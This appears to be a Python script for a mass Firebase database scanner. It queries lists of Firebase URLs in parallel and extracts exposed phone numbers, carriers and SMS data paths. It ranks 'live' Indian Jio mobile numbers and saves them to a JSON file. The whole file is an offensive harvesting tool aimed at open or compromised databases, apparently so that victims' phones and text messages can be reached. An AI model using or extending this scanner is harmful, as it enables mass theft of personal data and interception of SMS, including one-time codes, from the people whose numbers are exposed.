import os
import sys
import time
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from firebase_engine import FirebaseEngine, clean_firebase_url, extract_firebase_urls

sys.stdout.reconfigure(encoding='utf-8')

def main():
    # 1. Load URLs from arguments or firebase_url.txt
    urls = []
    if len(sys.argv) > 1:
        for arg in sys.argv[1:]:
            found = extract_firebase_urls(arg)
            urls.extend(found)
    
    if not urls and os.path.exists('firebase_url.txt'):
        with open('firebase_url.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line:
                    parts = line.split()
                    u = parts[-1].strip()
                    if u.startswith('http'):
                        urls.append(u)

    unique_urls = []
    seen = set()
    for u in urls:
        cleaned = clean_firebase_url(u)
        if cleaned.startswith('http') and cleaned not in seen:
            seen.add(cleaned)
            unique_urls.append(cleaned)

    print("=" * 65)
    print(f"🚀 ULTRA-FAST PARALLEL FIREBASE SCANNER")
    print(f"Targeting: {len(unique_urls)} unique Firebase Databases")
    print(f"Concurrency: 50 Parallel Workers")
    print("=" * 65 + "\n", flush=True)

    t_start = time.time()
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
    session.mount('https://', adapter)

    all_devices = []
    active_dbs = 0
    offline_or_locked = 0
    dbs_report = {}

    def _worker(u):
        t0 = time.time()
        eng = FirebaseEngine(u)
        eng.session = session
        devs = eng.discover_devices()
        duration = time.time() - t0
        return u, devs, duration

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(_worker, u): u for u in unique_urls}
        for f in as_completed(futures):
            u, devs, duration = f.result()
            if devs:
                active_dbs += 1
                live_devs = [d for d in devs if d.get('activity_score', 0) >= 500]
                print(f"🔥 [{duration:.2f}s] {u} -> {len(devs)} phones ({len(live_devs)} LIVE/RECENT)", flush=True)
                for d in devs[:2]:
                    tag = " [LIVE]" if d.get('activity_score', 0) >= 500 else ""
                    print(f"   📱 {d['phone']} | Carrier: {d['carrier']} | SMS: {d['sms_path']}{tag}", flush=True)
                all_devices.extend(devs)
                dbs_report[u] = {
                    'status': 'open',
                    'devices_count': len(devs),
                    'live_count': len(live_devs),
                    'duration': round(duration, 2)
                }
            else:
                offline_or_locked += 1
                dbs_report[u] = {
                    'status': 'empty_or_offline',
                    'devices_count': 0,
                    'live_count': 0,
                    'duration': round(duration, 2)
                }

    # Deduplicate phones preserving highest activity score
    unique_devices_map = {}
    for d in all_devices:
        p = d['phone']
        if p not in unique_devices_map or d.get('activity_score', 0) > unique_devices_map[p].get('activity_score', 0):
            unique_devices_map[p] = d

    sorted_devices = sorted(unique_devices_map.values(), key=lambda x: x.get('activity_score', 0), reverse=True)
    live_count = sum(1 for d in sorted_devices if d.get('activity_score', 0) >= 500)
    total_time = round(time.time() - t_start, 2)

    # Save outputs
    with open('scanned_devices.json', 'w', encoding='utf-8') as f:
        json.dump({
            'total_urls': len(unique_urls),
            'active_dbs': active_dbs,
            'total_unique_phones': len(sorted_devices),
            'live_phones': live_count,
            'duration_seconds': total_time,
            'devices': sorted_devices
        }, f, indent=2)

    with open('scanned_firebase.json', 'w', encoding='utf-8') as f:
        json.dump(dbs_report, f, indent=2)

    print("\n" + "=" * 65)
    print("📊 SCAN RESULTS SUMMARY")
    print(f"• Total URLs Scanned: {len(unique_urls)}")
    print(f"• Active Databases with Devices: {active_dbs}")
    print(f"• Inactive/Locked/Empty: {offline_or_locked}")
    print(f"• Total Unique Indian Mobile Numbers: {len(sorted_devices)}")
    print(f"• Verified Live / Recently Active Devices: {live_count}")
    print(f"• Total Elapsed Time: {total_time} SECONDS ⚡")
    print("=" * 65)

    if sorted_devices:
        print("\n🏆 TOP 10 HIGHEST-SCORING LIVE JIO NUMBERS:")
        for idx, d in enumerate(sorted_devices[:10], 1):
            status_desc = "🟢 ONLINE" if d.get('status_online') else ("🟡 RECENT" if d.get('activity_score', 0) >= 500 else "⚪ CANDIDATE")
            print(f"{idx}. {d['phone']} | {status_desc} | DB: {d.get('base_url')} | SMS: {d['sms_path']}")

    print("\nSaved full device list to 'scanned_devices.json'")

if __name__ == '__main__':
    main()

